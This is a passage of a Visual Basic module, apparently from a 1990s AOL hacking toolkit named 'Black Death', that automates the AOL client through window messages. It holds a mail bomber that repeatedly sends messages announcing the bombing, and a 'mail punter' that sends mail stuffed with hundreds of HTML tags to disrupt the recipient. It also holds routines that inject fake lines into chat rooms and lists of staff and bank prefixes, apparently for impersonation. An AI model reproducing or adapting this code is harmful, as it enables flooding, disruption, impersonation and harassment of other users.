x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "  " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "   " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "    " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "     " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "      " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "       " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "        " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "         " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "        " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "       " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "      " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "     " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "    " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "   " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "  " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, " " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)

End Sub

Sub AOL_MailBombT3 (who, subject)
msg = msg & "•••··· BD [ultra] v¹·º [ Black Death Mail Bomber" & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed at " & gettime() & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed on " & Date & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed by " & UserSN() & KeyEnter()
MDI% = findchildbyclass(AOL_Window(), "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
icone% = findchildbyclass(mailwin%, "_AOL_Icon")
peepz% = findchildbyclass(mailwin%, "_AOL_Edit")
subjt% = findchildbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
Mess% = findchildbyclass(mailwin%, "RICHCNTL")
a = sendmessagebystring(peepz%, WM_SETTEXT, 0, who)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "" + subject)
a = sendmessagebystring(Mess%, WM_SETTEXT, 0, msg)
b% = findchildbyclass(mailwin%, "_AOL_ICON")
'----------
For x = 1 To Len(subject) + 1
spiral1 = "" + Mid(subject, x) + " " + Mid(subject, 1, x - 1) + ""
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, " " + spiral1): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
Next x
End Sub

Sub AOL_MailPunt (who, subject)
Dim Punt
Punt = "Black Death Mail Punter<H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3> + punt2"
punt2 = "<BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>"
aolsendmail who, subject, Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt

End Sub

Sub AOL_Manip (txt)
x = AOL_UserSN() 'Calls our custon get Screen Name Function
name1$ = x
Mess$ = txt
View% = findchildbyclass(findchatroom(), "_AOL_VIEW")
SendMe$ = CStr(Chr(13) & Chr(10) & name1$ + ":" & Chr(9) & Mess$)
change% = sendmessagebystring(View%, WM_SETTEXT, 0, SendMe$)

End Sub

Sub AOL_ManipLine (txt)
Mess = txt
View% = findchildbyclass(findchatroom(), "_AOL_VIEW")
SendMe$ = CStr(Chr(13) & Chr(10) & Mess)
change% = sendmessagebystring(View%, WM_SETTEXT, 0, SendMe$)

End Sub

Sub aol_menu (What)
AOL% = findwindow("AOL Frame25", 0&)
sndtext% = sendmessagebystring(AOL%, WM_SETTEXT, 0, What)
End Sub

Function AOL_Online () As Integer
AOL% = findwindow("AOL Frame25", 0&)
Welcome% = findchildbytitle(AOL%, "Welcome, ")
x = GetWindowTextLength(Welcome%)
cap$ = Space(x)
x = getwindowtext(Welcome%, cap$, x)
If InStr(cap$, ",") <> 0 Then AOL_Online = True
If InStr(cap$, ",") = 0 Then AOL_Online = False

End Function

Sub AOL_Prefix (combo1 As ComboBox)
combo1.AddItem "AAC"
combo1.AddItem "AACTech"
combo1.AddItem "AACHost"
combo1.AddItem "ABC"
combo1.AddItem "ABCHost"
combo1.AddItem "ACLU"
combo1.AddItem "ACCV"
combo1.AddItem "AEFD"
combo1.AddItem "AFA"
combo1.AddItem "AFC"
combo1.AddItem "AFL"
combo1.AddItem "Alumni"
combo1.AddItem "Amex"
combo1.AddItem "AOL"
combo1.AddItem "AOLTech"
combo1.AddItem "AOLive"
combo1.AddItem "Apogee"
combo1.AddItem "Aptiva"
combo1.AddItem "ARCHelp"
combo1.AddItem "ATTTech"
combo1.AddItem "AWWC"
combo1.AddItem "BankBoston"
combo1.AddItem "Bcreek"
combo1.AddItem "Beta"
combo1.AddItem "Bev9"
combo1.AddItem "Bjghost"
combo1.AddItem "Blabbo"
combo1.AddItem "BnkStock"
combo1.AddItem "B of A"
combo1.AddItem "BookPg"
combo1.AddItem "Broderbund"
combo1.AddItem "BT"
combo1.AddItem "BW"
combo1.AddItem "Capcom"
combo1.AddItem "CapOne"
combo1.AddItem "Centura"
combo1.AddItem "CFA"
combo1.AddItem "CFC"
combo1.AddItem "CFL"
combo1.AddItem "Cfndr"
combo1.AddItem "CGU"
combo1.AddItem "Chan1"
combo1.AddItem "Citibank"
combo1.AddItem "Citicorp"
combo1.AddItem "CityTV"
combo1.AddItem "CJ"
combo1.AddItem "CLDR"
combo1.AddItem "CLGE"
combo1.AddItem "CNN"
combo1.AddItem "CNR"
combo1.AddItem "CNW"
combo1.AddItem "COL"
combo1.AddItem "COL"
combo1.AddItem "Comerica"
combo1.AddItem "ComBnk"
combo1.AddItem "Commerce"
combo1.AddItem "Compte"
combo1.AddItem "Corestates"
combo1.AddItem "COS"
combo1.AddItem "COStaff"
combo1.AddItem "CourtTV"
combo1.AddItem "Cpov"
combo1.AddItem "Crestar"
combo1.AddItem "CS"
combo1.AddItem "CSDL"
combo1.AddItem "CTV"
combo1.AddItem "DCO"
combo1.AddItem "DCOM"
combo1.AddItem "DFCS"
combo1.AddItem "DigC"
combo1.AddItem "DRMT"
combo1.AddItem "EFHost"
combo1.AddItem "Engage"
combo1.AddItem "Estar"
combo1.AddItem "FAQTeam "
combo1.AddItem "FBM"
combo1.AddItem "FCA"
combo1.AddItem "FCC"
combo1.AddItem "FCL"
combo1.AddItem "Feedback"
combo1.AddItem "Fed"
combo1.AddItem "Ferndale"
combo1.AddItem "Fidelity"
combo1.AddItem "FstMich"
combo1.AddItem "Finteam"
combo1.AddItem "FPC"
combo1.AddItem "FSCT"
combo1.AddItem "FstUnion"
combo1.AddItem "FW"
combo1.AddItem "Gallry"
combo1.AddItem "GamePr"
combo1.AddItem "GATC"
combo1.AddItem "GCGC"
combo1.AddItem "GCGP"
combo1.AddItem "GCT"
combo1.AddItem "GCW"
combo1.AddItem "GenHost"
combo1.AddItem "GeoRep"
combo1.AddItem "GFS"
combo1.AddItem "GLCF"
combo1.AddItem "GMI"
combo1.AddItem "Gneeee"
combo1.AddItem "Gstand"
combo1.AddItem "Guide"
combo1.AddItem "GWC"
combo1.AddItem "GWRep"
combo1.AddItem "GWS"
combo1.AddItem "Hek"
combo1.AddItem "HHK"
combo1.AddItem "HistCh"
combo1.AddItem "HOC"
combo1.AddItem "Hollywood"
combo1.AddItem "Host"
combo1.AddItem "HostCW"
combo1.AddItem "Housenet"
combo1.AddItem "HPC"
combo1.AddItem "HSBnk"
combo1.AddItem "IBD"
combo1.AddItem "IBM"
combo1.AddItem "ICS"
combo1.AddItem "Ifrit"
combo1.AddItem "iGolf"
combo1.AddItem "IGTA"
combo1.AddItem "Improv"
combo1.AddItem "Inc"
combo1.AddItem "INNr"
combo1.AddItem "Inquest"
combo1.AddItem "IP"
combo1.AddItem "IPGSales"
combo1.AddItem "Jcomm"
combo1.AddItem "KBChat"
combo1.AddItem "Kbic"
combo1.AddItem "Kbiz"
combo1.AddItem "Kids"
combo1.AddItem "Kidswb"
combo1.AddItem "KO"
combo1.AddItem "KS"
combo1.AddItem "KwbChat"
combo1.AddItem "Kwbf"
combo1.AddItem "kwbjr"
combo1.AddItem "Kwbs"
combo1.AddItem "Laredo"
combo1.AddItem "Lifeline"
combo1.AddItem "List"
combo1.AddItem "LnBnk"
combo1.AddItem "Longmag"
combo1.AddItem "Lotsen"
combo1.AddItem "LoveDr"
combo1.AddItem "Lpad"
combo1.AddItem "MarvC"
combo1.AddItem "Mayorof"
combo1.AddItem "MCA"
combo1.AddItem "MCC"
combo1.AddItem "MCO"
combo1.AddItem "Mellon"
combo1.AddItem "Mfool"
combo1.AddItem "MHJ"
combo1.AddItem "MMPR"
combo1.AddItem "MMW"
combo1.AddItem "MoChat"
combo1.AddItem "Modus"
combo1.AddItem "MomsOn"
combo1.AddItem "MOL"
combo1.AddItem "Mplace"
combo1.AddItem "Msft"
combo1.AddItem "MServEd"
combo1.AddItem "MTV"
combo1.AddItem "MuchMusic"
combo1.AddItem "Music"
combo1.AddItem "MVC"
combo1.AddItem "MW"
combo1.AddItem "NAS"
combo1.AddItem "Nanmai"
combo1.AddItem "Nanmal"
combo1.AddItem "Napress"
combo1.AddItem "Nasher"
combo1.AddItem "Nasls"
combo1.AddItem "Navis"
combo1.AddItem "NBC"
combo1.AddItem "NChat"
combo1.AddItem "ncmc"
combo1.AddItem "NetAdmin"
combo1.AddItem "NGF"
combo1.AddItem "Nichols"
combo1.AddItem "Nicknite"
combo1.AddItem "Nickop"
combo1.AddItem "Nklodeon"
combo1.AddItem "NML"
combo1.AddItem "Novl"
combo1.AddItem "NW"
combo1.AddItem "NWA"
combo1.AddItem "NWT"
combo1.AddItem "OAO"
combo1.AddItem "OC"
combo1.AddItem "Ogf"
combo1.AddItem "OLT"
combo1.AddItem "Omni"
combo1.AddItem "OMS"
combo1.AddItem "OpsHelp95"
combo1.AddItem "OpsSec"
combo1.AddItem "ORJ"
combo1.AddItem "OSO"
combo1.AddItem "OWT"
combo1.AddItem "Oyvey"
combo1.AddItem "Parlor"
combo1.AddItem "PBM"
combo1.AddItem "PC"
combo1.AddItem "PCA"
combo1.AddItem "PCD"
combo1.AddItem "PCF"
combo1.AddItem "PCC"
combo1.AddItem "PCT"
combo1.AddItem "PCW"
combo1.AddItem "PDA"
combo1.AddItem "PDC"
combo1.AddItem "PF"
combo1.AddItem "PGFA"
combo1.AddItem "PKWareTech"
combo1.AddItem "PMAG"
combo1.AddItem "PNO"
combo1.AddItem "Poltcs"
combo1.AddItem "Polizei"
combo1.AddItem "PPRT"
combo1.AddItem "PS"
combo1.AddItem "PS1"
combo1.AddItem "PSCP"
combo1.AddItem "PStaff"
combo1.AddItem "Pub"
combo1.AddItem "Quantum"
combo1.AddItem "QLTF"
combo1.AddItem "QRJ"
combo1.AddItem "Qview"
combo1.AddItem "RainTeam"
combo1.AddItem "RDI"
combo1.AddItem "RDSD"
combo1.AddItem "Reallife"
combo1.AddItem "REF"
combo1.AddItem "RELM"
combo1.AddItem "Roadie"
combo1.AddItem "Roadtrip"
combo1.AddItem "Rpga"
combo1.AddItem "SAABRE"
combo1.AddItem "Sanwa"
combo1.AddItem "SCH"
combo1.AddItem "SFLD"
combo1.AddItem "SFNB"
combo1.AddItem "Signet"
combo1.AddItem "Simu"
combo1.AddItem "Sjmn"
combo1.AddItem "SPA"
combo1.AddItem "STATS"
combo1.AddItem "SunTrust"
combo1.AddItem "Surflink"
combo1.AddItem "SXTY"
combo1.AddItem "Tandy"
combo1.AddItem "Taxlogic"
combo1.AddItem "TeamJB"
combo1.AddItem "Tech"
combo1.AddItem "TekCon"
combo1.AddItem "TheKnot"
combo1.AddItem "THRV"
combo1.AddItem "TLA"
combo1.AddItem "Toon"
combo1.AddItem "TOS"
combo1.AddItem "TRGM"
combo1.AddItem "Trib"
combo1.AddItem "Triv"
combo1.AddItem "TSR"
combo1.AddItem "TVV"
combo1.AddItem "UGF"
combo1.AddItem "UGFA"
combo1.AddItem "UGFC"
combo1.AddItem "UGFL"
combo1.AddItem "UKMP"
combo1.AddItem "UKTech"
combo1.AddItem "Upgrde"
combo1.AddItem "USAW"
combo1.AddItem "UsBank"
combo1.AddItem "Usenet"
combo1.AddItem "Vanguard"
combo1.AddItem "VGS"
combo1.AddItem "VH1"
combo1.AddItem "WBKids"
combo1.AddItem "WCC"
combo1.AddItem "WEB"
combo1.AddItem "WellsFargo"
combo1.AddItem "WIZ"
combo1.AddItem "WLV"
combo1.AddItem "WRTR"
combo1.AddItem "WSF"
combo1.AddItem "WWF"
combo1.AddItem "XFF"
combo1.AddItem "XOL"
combo1.AddItem "Xronos"
combo1.AddItem "Ybiz"
combo1.AddItem "YGL"
combo1.AddItem "YTCC"
combo1.AddItem "ZD Host"
combo1.AddItem "ZDNet"
combo1.AddItem "ZoomRep"
combo1.ListIndex = 0
End Sub

Sub AOL_Sendim (who, Message)
aolver = AOLVersion()
If aolver = 30 Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
            
b = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = Message
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_ICON")  'Find one of the
            'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
x = sendmessagebynum(M, WM_LBUTTONDOWN, 0, 0&) 'Click send
pause .5
x = sendmessagebynum(M, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
Loop Until Off% <> 0
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Exit Sub
End If
If aolver = 25 Then
Call SendIM25(who, Message)
Exit Sub
End If

End Sub

Sub AOL_SendMail (person, subject, Message)
AOL% = findwindow("AOL Frame25", 0&)
If AOL% = 1 Then
        msg = msg & "Please Sign On First"
        response = MsgBox(msg, 47)
    
    Exit Sub
End If
Call RunMenuByString(AOL%, "Compose Mail")

Do: DoEvents
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
icone% = findchildbyclass(mailwin%, "_AOL_Icon")
peepz% = findchildbyclass(mailwin%, "_AOL_Edit")
subjt% = findchildbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
Mess% = findchildbyclass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And Mess% <> 0 Then Exit Do
Loop

a = sendmessagebystring(peepz%, WM_SETTEXT, 0, person)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, subject)
a = sendmessagebystring(Mess%, WM_SETTEXT, 0, Message)
b% = findchildbyclass(mailwin%, "_AOL_ICON")
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
subcd0 (.5)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)

'AOLIcon (icone%)

Do: DoEvents
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
erro% = findchildbytitle(MDI%, "Error")
aolw% = findwindow("#32770", "America Online")
If mailwin% = 0 Then Exit Do
If aolw% <> 0 Then
a = SendMessage(aolw%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop

End Sub

Sub AOL_SendText (txt)
DoEvents
AOLEdit% = findchildbyclass(findchatroom(), "_AOL_Edit")
Call SetEdit(AOLEdit%, txt)
Call Enter(AOLEdit%)
DoEvents

End Sub

Sub AOL_SetMenu (room)
a = findwindow("AOL Frame25", 0&) 'Find AOL
If a = 0 Then
    MsgBox "Can't find AOL", 30
    Exit Sub
End If
room2 = "aol://2719:2-2-" & room
Call RunMenuByString(a, "Edit Go To Menu") 'Call RunMenu
                'Function we made
Do: DoEvents 'Begin a huge loop, make sure we allow the
        'the system to continue by DoEvents
b = findwindow("_AOL_MODAL", 0&) 'Look for EDIT Menu
If b <> 0 Then
    c = findchildbyclass(b, "_AOL_EDIT") 'Find the 1st edit
    If c <> 0 Then Exit Do 'Make sure we didn't find
            'Another Modal Window
End If
Loop

x = sendmessagebystring(c, WM_SETTEXT, 0, room)
        'Put our text in the edit box
d = getnextwindow(c, 2)  'Get the next edit box
x = sendmessagebystring(d, WM_SETTEXT, 0, room2)
        'Put the text in the next window
e = findchildbytitle(b, "Save Changes")
        'Find the save button
x = sendmessagebynum(e, WM_LBUTTONDOWN, 0, 0&) 'Click Down
pause .5
x = sendmessagebynum(e, WM_LBUTTONUP, 0, 0&)   'Click UP
pause 2

End Sub

Sub AOL_ShowAOL ()
a = findwindow("AOL Frame25", 0&)
    x = ShowWindow(a, SW_Show)

End Sub

Sub AOL_Timeout (p06F2 As Variant)
Dim l06F6 As Variant
l06F6 = Timer
Do While Timer - l06F6 <= p06F2
DoEvents
Loop

End Sub

Function AOL_UserSN () As String
On Error Resume Next
buffa$ = String$(255, 0)
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
WEL% = findchildbytitle(MDI%, "Welcome, ")
If WEL% = 0 Then Exit Function
WTXT% = getwindowtext(WEL%, buffa$, &H20)
RM = Trim$(buffa$)
SearchStart = InStr(1, buffa$, ", ")
tempbuffa$ = Mid$(buffa$, SearchStart + 2)
LD = Trim$(tempbuffa$)
EXCLA = InStr(1, tempbuffa$, "!")
SN$ = Left$(tempbuffa$, EXCLA - 1):
AOL_UserSN = SN$

End Function

Sub AOL_Violation (Combo2 As Control)
Combo2.AddItem "Srolling"
Combo2.AddItem "Egregious Abuse/Fake Report/Dup Account"
Combo2.AddItem "Password Solicitation"
Combo2.AddItem "Staff Impersonation"
Combo2.AddItem "Mail Bombing"
Combo2.AddItem "Illegal Web/FTP"
Combo2.AddItem "Transfer: Graphics 01"
Combo2.AddItem "Transfer: Virus"
Combo2.AddItem "Transfer: Copyrighted Software (CopySoft)"
Combo2.AddItem "Transfer: Hackware (AOHell, etc.)"
Combo2.AddItem "Physical Threat"
Combo2.AddItem "Use of Hackware (AOHell, etc.)"
Combo2.AddItem "Employee Termination - Standing 01"
Combo2.AddItem "Invalid Account Information"
Combo2.AddItem "Vulgarity"
Combo2.AddItem "Sexually Explicit"
Combo2.AddItem "Disruption (room and Board)"
Combo2.AddItem "Malicious Mischief"
Combo2.AddItem "Harassment"
Combo2.AddItem "Chain Letters"
Combo2.AddItem "Unacceptable Discussion"
Combo2.AddItem "Unsolicited Advertising/Mass Mailing"
Combo2.AddItem "IRC Abuse/Hacking"
Combo2.AddItem "Member Impersonation"
Combo2.AddItem "Unacceptable Screen Name"
Combo2.AddItem "Unacceptable Profile"
Combo2.AddItem "Unacceptable Webpage/ftp"
Combo2.AddItem "Games lock out/termination"
Combo2.AddItem "Creation of Vulgar Room Name"
Combo2.AddItem "Transfer: Graphics 02"
Combo2.ListIndex = 0
End Sub

Sub AOL_Welcome (SN)
a = findwindow("AOL Frame25", 0&)
b = findchildbytitle(a, "Welcome, ")
c = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
code = SN
c = sendmessagebystring(b, WM_SETTEXT, 0, code)

End Sub

Function AOL_Window ()
a = findwindow("AOL Frame25", 0&)
AOL_Window = a

End Function

Sub AOLClick (E1 As Integer)
'Clicks an AOL button with the given handle as E1

Exit Sub


do_wn = sendmessagebynum(E1, WM_LBUTTONDOWN, 0, 0&)
pause .008
u_p = sendmessagebynum(E1, WM_LBUTTONUP, 0, 0&)
End Sub

Sub AOLCloseMailError ()
Do
DoEvents
a = findwindow("AOL Frame25", 0&)  'Find AOL
bye = findchildbytitle(a, "Error") 'Find IM
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Loop Until a <> 0
End Sub

Sub AOLCloseMsg ()
Do
DoEvents
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
Loop Until Off% <> 0

End Sub

Sub AOLDisableWin ()
Dim bb As Integer
Dim dis_win As Integer
CessPit = enablewindow(aolhwnd(), 0)
fc = findchildbyclass(aolhwnd(), "AOL Child")
req = enablewindow(fc, 1)
faa = fc
Do
DoEvents
Let faf = faa
faa = getnextwindow(faa, 2)
res = enablewindow(faa, 1)
DoEvents
Loop Until faf = faa
End Sub

Sub AOLEnableWin ()
Dim bb As Integer
Dim dis_win As Integer
CessPit = enablewindow(aolhwnd(), 1)
fc = findchildbyclass(aolhwnd(), "AOL Child")
req = enablewindow(fc, 1)
faa = fc
Do
DoEvents
Let faf = faa
faa = getnextwindow(faa, 2)
res = enablewindow(faa, 1)
DoEvents
Loop Until faf = faa
End Sub

Function aolhwnd ()
'finds AOL's handle
a = findwindow("AOL Frame25", 0&)
aolhwnd = a
End Function

Sub AOLMailBomb (person, subject, Message)
'Opens an AOL Mail and fills it out to PERSON, with a
'subject of SUBJECT, and a message of MESSAGE.
'*****THIS DOES NOT SEND THE MAIL  !! ******

AOL% = findwindow("AOL Frame25", 0&)
If AOL% = 0 Then
        msg = msg & "Please Sign On First"
        response = MsgBox(msg, 47)
    
    Exit Sub
End If
Call RunMenuByString(AOL%, "Compose Mail")

Do: DoEvents
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
icone% = findchildbyclass(mailwin%, "_AOL_Icon")
peepz% = findchildbyclass(mailwin%, "_AOL_Edit")
subjt% = findchildbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
Mess% = findchildbyclass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And Mess% <> 0 Then Exit Do
Loop

a = sendmessagebystring(peepz%, WM_SETTEXT, 0, person)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, subject)
a = sendmessagebystring(Mess%, WM_SETTEXT, 0, Message)
b% = findchildbyclass(mailwin%, "_AOL_ICON")
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)

'AOLIcon (icone%)

Do: DoEvents
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
erro% = findchildbytitle(MDI%, "Error")
aolw% = findwindow("#32770", "America Online")
If mailwin% = 0 Then Exit Do
If aolw% <> 0 Then
Exit Do
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_CLOSE, 0, 0)

Exit Do
End If
Loop


End Sub

Function AolModule ()
wurd = GetWindowWOrd(aolwin(), -6)
Dim stuf As String * 100
uh = GetModuleFileName(wurd, stuf, 100)
AolModule = stuf
End Function

Sub aolsendim (who, Message)
If AOLVersion() = 30 Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
